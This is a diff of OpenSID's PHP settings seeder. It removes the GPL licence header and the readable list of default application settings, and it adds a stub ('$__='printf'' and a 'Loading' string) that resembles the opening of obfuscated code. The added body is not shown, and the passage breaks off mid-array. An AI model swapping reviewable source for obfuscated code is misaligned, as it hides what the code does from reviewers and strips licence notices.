@@ -1,1331 +1,633 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/models/seeders/dataAwal/SettingAplikasi.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-use App\Enums\OfflineModeEnum;
-use App\Libraries\TinyMCE;
-use App\Models\SettingAplikasi as SettingAplikasiModel;
-use Illuminate\Support\Facades\DB;
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class SettingAplikasi extends CI_Model
-{
-    public function getData()
-    {
-        return [
-            [
-                'judul'      => 'Sebutan Kabupaten',
-                'key'        => 'sebutan_kabupaten',
-                'value'      => 'kabupaten',
-                'keterangan' => 'Pengganti sebutan wilayah kabupaten',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Sebutan Kabupaten Singkat',
-                'key'        => 'sebutan_kabupaten_singkat',
-                'value'      => 'kab.',
-                'keterangan' => 'Pengganti sebutan singkatan wilayah kabupaten',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Sebutan Kecamatan',
-                'key'        => 'sebutan_kecamatan',
-                'value'      => 'kecamatan',
-                'keterangan' => 'Pengganti sebutan wilayah kecamatan',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Sebutan Kecamatan Singkat',
-                'key'        => 'sebutan_kecamatan_singkat',
-                'value'      => 'kec.',
-                'keterangan' => 'Pengganti sebutan singkatan wilayah kecamatan',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Sebutan Desa',
-                'key'        => 'sebutan_desa',
-                'value'      => 'desa',
-                'keterangan' => 'Pengganti sebutan wilayah desa',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Sebutan Dusun',
-                'key'        => 'sebutan_dusun',
-                'value'      => 'dusun',
-                'keterangan' => 'Pengganti sebutan wilayah dusun',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Sebutan Camat',
-                'key'        => 'sebutan_camat',
-                'value'      => 'camat',
-                'keterangan' => 'Pengganti sebutan jabatan camat',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Website Title',
-                'key'        => 'website_title',
-                'value'      => 'Website Resmi',
-                'keterangan' => 'Judul tab browser modul web',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'web',
-            ],
-            [
-                'judul'      => 'Login Title',
-                'key'        => 'login_title',
-                'value'      => 'OpenSID',
-                'keterangan' => 'Judul tab browser halaman login modul administrasi',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Admin Title',
-                'key'        => 'admin_title',
-                'value'      => 'Sistem Informasi',
-                'keterangan' => 'Judul tab browser modul administrasi',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Web Theme',
-                'key'        => 'web_theme',
-                'value'      => config_item('web_theme') ?: 'natra',
-                'keterangan' => 'Tema penampilan modul web',
-                'jenis'      => 'option',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'web',
-            ],
-            [
-                'judul'      => 'Offline Mode',
-                'key'        => 'offline_mode',
-                'value'      => OfflineModeEnum::PUBLIK,
-                'keterangan' => 'Apakah modul web akan ditampilkan atau tidak',
-                'jenis'      => 'option',
-                'option'     => OfflineModeEnum::allToJson(),
-                'attribute'  => null,
-                'kategori'   => 'web',
-            ],
-            [
-                'judul'      => 'Enable Track',
-                'key'        => 'enable_track',
-                'value'      => '1',
-                'keterangan' => 'Apakah akan mengirimkan data statistik ke tracker',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Mapbox Key',
-                'key'        => 'mapbox_key',
-                'value'      => null,
-                'keterangan' => 'Mapbox API Key untuk peta',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'web',
-            ],
-            [
-                'judul'      => 'Libreoffice Path',
-                'key'        => 'libreoffice_path',
-                'value'      => null,
-                'keterangan' => 'Path tempat instal libreoffice di server SID',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Sumber Gambar Slider',
-                'key'        => 'sumber_gambar_slider',
-                'value'      => '2',
-                'keterangan' => 'Sumber gambar slider besar',
-                'jenis'      => 'option',
-                'option'     => json_encode([
-                    '1' => 'Gambar utama artikel terbaru',
-                    '2' => 'Gambar utama artikel terbaru yang masuk ke slider atas',
-                    '3' => 'Gambar dalam album galeri yang dimasukkan ke slider',
-                ]),
-                'attribute' => null,
-                'kategori'  => 'web',
-            ],
-            [
-                'judul'      => 'Sebutan Singkatan Kadus',
-                'key'        => 'sebutan_singkatan_kadus',
-                'value'      => 'kawil',
-                'keterangan' => 'Sebutan singkatan jabatan kepala dusun',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Current Version',
-                'key'        => 'current_version',
-                'value'      => currentVersion(),
-                'keterangan' => 'Versi sekarang untuk migrasi',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="" disabled',
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Timezone',
-                'key'        => 'timezone',
-                'value'      => 'Asia/Jakarta',
-                'keterangan' => 'Zona waktu perekaman waktu dan tanggal',
-                'jenis'      => 'option',
-                'option'     => json_encode([
-                    'Asia/Jakarta'  => 'Asia/Jakarta',
-                    'Asia/Makassar' => 'Asia/Makassar',
-                    'Asia/Jayapura' => 'Asia/Jayapura',
-                ]),
-                'attribute' => null,
-                'kategori'  => 'sistem',
-            ],
-            [
-                'judul'      => 'Web Artikel Per Page',
-                'key'        => 'web_artikel_per_page',
-                'value'      => '8',
-                'keterangan' => 'Jumlah artikel dalam satu halaman',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="int"',
-                'kategori'   => 'web_theme',
-            ],
-            [
-                'judul'      => 'Penomoran Surat',
-                'key'        => 'penomoran_surat',
-                'value'      => '2',
-                'keterangan' => 'Penomoran surat mulai dari satu (1) setiap tahun',
-                'jenis'      => 'option',
-                'option'     => json_encode([
-                    '1' => 'Nomor berurutan untuk masing-masing surat masuk dan keluar; dan untuk semua surat layanan',
-                    '2' => 'Nomor berurutan untuk masing-masing surat masuk dan keluar; dan untuk setiap surat layanan dengan jenis yang sama',
-                    '3' => 'Nomor berurutan untuk keseluruhan surat layanan, masuk dan keluar',
-                ]),
-                'attribute' => null,
-                'kategori'  => 'sistem',
-            ],
-            [
-                'judul'      => 'Dashboard Program Bantuan',
-                'key'        => 'dashboard_program_bantuan',
-                'value'      => '1',
-                'keterangan' => 'ID program bantuan yang ditampilkan di dashboard',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="int"',
-                'kategori'   => 'dashboard',
-            ],
-            [
-                'judul'      => 'Panjang Nomor Surat',
-                'key'        => 'panjang_nomor_surat',
-                'value'      => null,
-                'keterangan' => "Nomor akan diisi '0' di sebelah kiri, kalau perlu",
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="int"',
-                'kategori'   => 'surat',
-            ],
-            [
-                'judul'      => 'Warna Tema Admin',
-                'key'        => 'warna_tema_admin',
-                'value'      => 'skin-purple',
-                'keterangan' => 'Warna dasar tema komponen Admin',
-                'jenis'      => 'option',
-                'option'     => json_encode([
-                    'skin-blue'         => 'Biru',
-                    'skin-blue-light'   => 'Biru Terang',
-                    'skin-black'        => 'Hitam',
-                    'skin-black-light'  => 'Hitam Terang',
-                    'skin-red'          => 'Merah',
-                    'skin-red-light'    => 'Merah Terang',
-                    'skin-yellow'       => 'Kuning',
-                    'skin-yellow-light' => 'Kuning Terang',
-                    'skin-purple'       => 'Ungu',
-                    'skin-purple-light' => 'Ungu Terang',
-                    'skin-green'        => 'Hijau',
-                    'skin-green-light'  => 'Hijau Terang',
-                ]),
-                'attribute' => null,
-                'kategori'  => 'sistem',
-            ],
-            [
-                'judul'      => 'Format Nomor Surat',
-                'key'        => 'format_nomor_surat',
-                'value'      => '[kode_surat]/[nomor_surat, 3]/[kode_desa]/[bulan_romawi]/[tahun]',
-                'keterangan' => 'Fomat penomoran surat',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'format_surat',
-            ],
-            [
-                'judul'      => 'Penggunaan Server',
-                'key'        => 'penggunaan_server',
-                'value'      => '1 ',
-                'keterangan' => 'Setting penggunaan server',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="int"',
-                'kategori'   => 'hidden',
-            ],
-            [
-                'judul'      => 'Daftar Penerima Bantuan',
-                'key'        => 'daftar_penerima_bantuan',
-                'value'      => '1',
-                'keterangan' => 'Apakah akan tampilkan daftar penerima bantuan di statistik halaman muka',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'conf_web',
-            ],
-            [
-                'judul'      => 'Apbdes Footer',
-                'key'        => 'apbdes_footer',
-                'value'      => '1',
-                'keterangan' => 'Apakah akan tampilkan grafik APBDes di halaman muka',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'conf_web',
-            ],
-            [
-                'judul'      => 'Apbdes Footer All',
-                'key'        => 'apbdes_footer_all',
-                'value'      => '1',
-                'keterangan' => 'Apakah akan tampilkan grafik APBDes di semua halaman',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'conf_web',
-            ],
-            [
-                'judul'      => 'Apbdes Manual Input',
-                'key'        => 'apbdes_manual_input',
-                'value'      => '0',
-                'keterangan' => 'Apakah akan tampilkan grafik APBDes yang diinput secara manual',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'conf_web',
-            ],
-            [
-                'judul'      => 'Covid Desa',
-                'key'        => 'covid_desa',
-                'value'      => '0',
-                'keterangan' => 'Apakah akan tampilkan status Covid-19 Desa di halaman muka',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'conf_web',
-            ],
-            [
-                'judul'      => 'Covid RSS',
-                'key'        => 'covid_rss',
-                'value'      => '0',
-                'keterangan' => 'Apakah akan tampilkan RSS Covid-19 di halaman muka',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'conf_web',
-            ],
-            [
-                'judul'      => 'Statistik Chart 3D',
-                'key'        => 'statistik_chart_3d',
-                'value'      => '1',
-                'keterangan' => 'Apakah akan tampilkan Statistik Chart 3D',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'conf_web',
-            ],
-            [
-                'judul'      => 'Sebutan NIP Desa',
-                'key'        => 'sebutan_nip_desa',
-                'value'      => 'NIPD',
-                'keterangan' => 'Pengganti sebutan label niap/nipd',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Layanan Mandiri',
-                'key'        => 'layanan_mandiri',
-                'value'      => '1',
-                'keterangan' => 'Apakah layanan mandiri ditampilkan atau tidak',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'setting_mandiri',
-            ],
-            [
-                'judul'      => 'Ukuran Lebar Bagan',
-                'key'        => 'ukuran_lebar_bagan',
-                'value'      => '800',
-                'keterangan' => 'Ukuran Lebar Bagan (800 / 1200 / 1400)',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="int"',
-                'kategori'   => 'conf_bagan',
-            ],
-            [
-                'judul'      => 'Api Opendk Server',
-                'key'        => 'api_opendk_server',
-                'value'      => null,
-                'keterangan' => 'Alamat Server OpenDK (contoh: https://demodk.opendesa.id)',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'opendk',
-            ],
-            [
-                'judul'      => 'Api Opendk Key',
-                'key'        => 'api_opendk_key',
-                'value'      => null,
-                'keterangan' => 'OpenDK API Key untuk Sinkronisasi Data',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'opendk',
-            ],
-            [
-                'judul'      => 'Api Opendk User',
-                'key'        => 'api_opendk_user',
-                'value'      => null,
-                'keterangan' => 'Email Login Pengguna OpenDK',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'opendk',
-            ],
-            [
-                'judul'      => 'Api Opendk Password',
-                'key'        => 'api_opendk_password',
-                'value'      => null,
-                'keterangan' => 'Password Login Pengguna OpenDK',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'opendk',
-            ],
-            [
-                'judul'      => 'Tgl Data Lengkap',
-                'key'        => 'tgl_data_lengkap',
-                'value'      => null,
-                'keterangan' => 'Atur data tanggal sudah lengkap',
-                'jenis'      => 'datetime',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'data_lengkap',
-            ],
-            [
-                'judul'      => 'Tgl Data Lengkap Aktif',
-                'key'        => 'tgl_data_lengkap_aktif',
-                'value'      => '0',
-                'keterangan' => 'Aktif / Non-aktif data tanggal sudah lengkap',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'data_lengkap',
-            ],
-            [
-                'judul'      => 'Api Gform Id Script',
-                'key'        => 'api_gform_id_script',
-                'value'      => null,
-                'keterangan' => 'Script ID untuk Google API',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'setting_analisis',
-            ],
-            [
-                'judul'      => 'Api Gform Credential',
-                'key'        => 'api_gform_credential',
-                'value'      => null,
-                'keterangan' => 'Credential untuk Google API',
-                'jenis'      => 'textarea',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'setting_analisis',
-            ],
-            [
-                'judul'      => 'Api Gform Redirect Uri',
-                'key'        => 'api_gform_redirect_uri',
-                'value'      => 'https://berputar.opendesa.id/index.php/first/get_form_info',
-                'keterangan' => 'Redirecet URI untuk Google API',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'setting_analisis',
-            ],
-            [
-                'judul'      => 'Tampilkan Lapak Web',
-                'key'        => 'tampilkan_lapak_web',
-                'value'      => '1',
-                'keterangan' => 'Aktif / Non-aktif Lapak di Halaman Website Url Terpisah',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'lapak',
-            ],
-            [
-                'judul'      => 'Pesan Singkat WA',
-                'key'        => 'pesan_singkat_wa',
-                'value'      => 'Saya ingin membeli [nama_produk] yang anda tawarkan di Lapak Desa [link_web]',
-                'keterangan' => 'Pesan Singkat WhatsApp',
-                'jenis'      => 'textarea',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'lapak',
-            ],
-            [
-                'judul'      => 'Banyak Foto Tiap Produk',
-                'key'        => 'banyak_foto_tiap_produk',
-                'value'      => '3',
-                'keterangan' => 'Banyaknya foto tiap produk yang bisa di unggah',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="int"',
-                'kategori'   => 'lapak',
-            ],
-            [
-                'judul'      => 'Jumlah Produk Perhalaman',
-                'key'        => 'jumlah_produk_perhalaman',
-                'value'      => '10',
-                'keterangan' => 'Jumlah produk yang ditampilkan dalam satu halaman',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="int"',
-                'kategori'   => 'lapak',
-            ],
-            [
-                'judul'      => 'Layanan Opendesa Token',
-                'key'        => 'layanan_opendesa_token',
-                'value'      => null,
-                'keterangan' => 'Token pelanggan Layanan OpenDESA',
-                'jenis'      => 'textarea',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'pelanggan',
-            ],
-            [
-                'judul'      => 'Footer Surat TTE',
-                'key'        => 'footer_surat_tte',
-                'value'      => TinyMCE::FOOTER_TTE,
-                'keterangan' => 'Footer Surat TTE',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'format_surat',
-            ],
-            [
-                'judul'      => 'Telegram Token',
-                'key'        => 'telegram_token',
-                'value'      => null,
-                'keterangan' => 'Telgram token',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Telegram User Id',
-                'key'        => 'telegram_user_id',
-                'value'      => null,
-                'keterangan' => 'Telgram user id untuk notifikasi ke pengguna',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Tampilan Anjungan',
-                'key'        => 'tampilan_anjungan',
-                'value'      => '0',
-                'keterangan' => 'Pilih tampilan di anjungan pada saat tidak ada aktifitas pada halaman login.',
-                'jenis'      => 'option',
-                'option'     => json_encode([
-                    '0' => 'Tidak Aktif',
-                    '1' => 'Slider',
-                    '2' => 'Video',
-                ]),
-                'attribute' => null,
-                'kategori'  => 'anjungan',
-            ],
-            [
-                'judul'      => 'Tampilan Anjungan Waktu',
-                'key'        => 'tampilan_anjungan_waktu',
-                'value'      => '30',
-                'keterangan' => 'Atur waktu (detik) kapan tampilan di anjungan akan muncul pada saat tidak ada aktifitas di halaman login.',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="int"',
-                'kategori'   => 'anjungan',
-            ],
-            [
-                'judul'      => 'Tampilan Anjungan Slider',
-                'key'        => 'tampilan_anjungan_slider',
-                'value'      => null,
-                'keterangan' => 'Pilih album yang akan ditampilkan pada anjungan.',
-                'jenis'      => 'option',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'anjungan',
-            ],
-            [
-                'judul'      => 'Tampilan Anjungan Video',
-                'key'        => 'tampilan_anjungan_video',
-                'value'      => null,
-                'keterangan' => 'Masukan link video dengan format .mp4 yang akan ditampilkan pada anjungan',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'anjungan',
-            ],
-            [
-                'judul'      => 'Tampilkan Pendaftaran',
-                'key'        => 'tampilkan_pendaftaran',
-                'value'      => '0',
-                'keterangan' => 'Aktifkan / Non Aktifkan Pendaftaran Layanan Mandiri',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'setting_mandiri',
-            ],
-            [
-                'judul'      => 'Tampilan Anjungan Audio',
-                'key'        => 'tampilan_anjungan_audio',
-                'value'      => '0',
-                'keterangan' => 'Apakah audio diaktifkan atau tidak saat video diputar',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'anjungan',
-            ],
-            [
-                'judul'      => 'Branding Desa',
-                'key'        => 'branding_desa',
-                'value'      => 'LAYANAN MANDIRI',
-                'keterangan' => 'Nama Branding Aplikasi Layanan Mandiri Android',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'mobile',
-            ],
-            [
-                'judul'      => 'Tampilkan Kehadiran',
-                'key'        => 'tampilkan_kehadiran',
-                'value'      => '1',
-                'keterangan' => 'Aktif / Non-aktifkan Halaman Website Kehadiran',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'kehadiran',
-            ],
-            [
-                'judul'      => 'IP Adress Kehadiran',
-                'key'        => 'ip_adress_kehadiran',
-                'value'      => null,
-                'keterangan' => 'IP Address Perangkat Kehadiran',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="ip_address" placeholder="127.0.0.1"',
-                'kategori'   => 'kehadiran',
-            ],
-            [
-                'judul'      => 'MAC Adress Kehadiran',
-                'key'        => 'mac_adress_kehadiran',
-                'value'      => null,
-                'keterangan' => 'MAC Address Perangkat Kehadiran',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="mac_address" placeholder="00:1B:44:11:3A:B7"',
-                'kategori'   => 'kehadiran',
-            ],
-            [
-                'judul'      => 'Tahun IDM',
-                'key'        => 'tahun_idm',
-                'value'      => '2020',
-                'keterangan' => 'Default tahun IDM saat pertamakali dibuka',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'status desa',
-            ],
-            [
-                'judul'      => 'Aktifkan SMS',
-                'key'        => 'aktifkan_sms',
-                'value'      => '0',
-                'keterangan' => 'Aktif / Non-aktifkan Kirim SMS ke Warga',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'hubung warga',
-            ],
-            [
-                'judul'      => 'Hubung Warga Balas Otomatis',
-                'key'        => 'hubung_warga_balas_otomatis',
-                'value'      => 'Terima kasih pesan Anda telah kami terima.',
-                'keterangan' => 'Hubung warga isi pesan bawaan balas otomatis',
-                'jenis'      => 'textarea',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'hubung warga',
-            ],
-            [
-                'judul'      => 'Latar Kehadiran',
-                'key'        => 'latar_kehadiran',
-                'value'      => null,
-                'keterangan' => 'Latar Kehadiran',
-                'jenis'      => 'unggah',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'kehadiran',
-            ],
-            [
-                'judul'      => 'Id Pengunjung Kehadiran',
-                'key'        => 'id_pengunjung_kehadiran',
-                'value'      => null,
-                'keterangan' => 'ID Pengunjung Perangkat Kehadiran',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="alfanumerik" placeholder="ad02c373c2a8745d108aff863712fe92"',
-                'kategori'   => 'kehadiran',
-            ],
-            [
-                'judul'      => 'Header Surat',
-                'key'        => 'header_surat',
-                'value'      => TinyMCE::HEADER,
-                'keterangan' => 'Header Surat',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'format_surat',
-            ],
-            [
-                'judul'      => 'Tinggi Header',
-                'key'        => 'tinggi_header',
-                'value'      => TinyMCE::TOP,
-                'keterangan' => 'Tinggi Header Surat',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'format_surat',
-            ],
-            [
-                'judul'      => 'Footer Surat',
-                'key'        => 'footer_surat',
-                'value'      => TinyMCE::FOOTER,
-                'keterangan' => 'Footer Surat',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'format_surat',
-            ],
-            [
-                'judul'      => 'Tinggi Footer',
-                'key'        => 'tinggi_footer',
-                'value'      => TinyMCE::BOTTOM,
-                'keterangan' => 'Tinggi Footer Surat',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'format_surat',
-            ],
-            [
-                'judul'      => 'Font Surat',
-                'key'        => 'font_surat',
-                'value'      => 'Arial',
-                'keterangan' => 'Font Surat Utama',
-                'jenis'      => 'text',
-                'option'     => json_encode([
-                    'Andale Mono',
-                    'Arial',
-                    'Arial Black',
-                    'Bookman Old Style',
-                    'Comic Sans MS',
-                    'Courier New',
-                    'Georgia',
-                    'Helvetica',
-                    'Impact',
-                    'Tahoma',
-                    'Times New Roman',
-                    'Trebuchet MS',
-                    'Verdana',
-                ]),
-                'attribute' => null,
-                'kategori'  => 'format_surat',
-            ],
-            [
-                'judul'      => 'Jenis Peta',
-                'key'        => 'jenis_peta',
-                'value'      => '5',
-                'keterangan' => 'Jenis peta yang digunakan',
-                'jenis'      => 'option',
-                'option'     => json_encode([
-                    '1' => 'OpenStreetMap',
-                    '2' => 'OpenStreetMap H.O.T',
-                    '3' => 'Mapbox Streets',
-                    '4' => 'Mapbox Satellite',
-                    '5' => 'Mapbox Satellite-Street',
-                ]),
-                'attribute' => null,
-                'kategori'  => 'peta',
-            ],
-            [
-                'judul'      => 'Verifikasi Kades',
-                'key'        => 'verifikasi_kades',
-                'value'      => '0',
-                'keterangan' => 'Verifikasi Surat Oleh Kepala Desa',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'alur_surat',
-            ],
-            [
-                'judul'      => 'Verifikasi Sekdes',
-                'key'        => 'verifikasi_sekdes',
-                'value'      => '0',
-                'keterangan' => 'Verifikasi Surat Oleh Sekretaris daerah',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'alur_surat',
-            ],
-            [
-                'judul'      => 'Notifikasi Koneksi',
-                'key'        => 'notifikasi_koneksi',
-                'value'      => '0',
-                'keterangan' => 'Ingatkan jika aplikasi tidak terhubung dengan internet.',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Tampil Luas Peta',
-                'key'        => 'tampil_luas_peta',
-                'value'      => '0',
-                'keterangan' => 'Tampilkan Luas Wilayah Pada Peta',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'TTE',
-                'key'        => 'tte',
-                'value'      => '0',
-                'keterangan' => 'TTE - Aktifkan Modul TTE',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'tte',
-            ],
-            [
-                'judul'      => 'TTE Api',
-                'key'        => 'tte_api',
-                'value'      => null,
-                'keterangan' => 'TTE - URL API TTE',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'tte',
-            ],
-            [
-                'judul'      => 'TTE Username',
-                'key'        => 'tte_username',
-                'value'      => null,
-                'keterangan' => 'TTE - Username untuk TTE',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'tte',
-            ],
-            [
-                'judul'      => 'TTE Password',
-                'key'        => 'tte_password',
-                'value'      => null,
-                'keterangan' => 'TTE - Password untuk TTE',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'tte',
-            ],
-            [
-                'judul'      => 'Kode Desa BPS',
-                'key'        => 'kode_desa_bps',
-                'value'      => '3524190011',
-                'keterangan' => 'Kode Desa BPS (Dapat di cek di https://sig.bps.go.id/bridging-kode)',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'status sdgs',
-            ],
-            [
-                'judul'      => 'Min Zoom Peta',
-                'key'        => 'min_zoom_peta',
-                'value'      => '1',
-                'keterangan' => 'Minimal pembesaran wilayah pada peta',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="int"',
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Max Zoom Peta',
-                'key'        => 'max_zoom_peta',
-                'value'      => '30',
-                'keterangan' => 'Maksimal pembesaran wilayah pada peta',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => 'class="int"',
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Notifikasi Pengajuan Surat',
-                'key'        => 'notifikasi_pengajuan_surat',
-                'value'      => 'Segera cek Halaman Admin, penduduk atas nama [nama_penduduk] telah mengajukan [judul_surat] melalui [melalui] pada tanggal [tanggal] TERIMA KASIH.',
-                'keterangan' => 'Pesan notifikasi pengajuan surat',
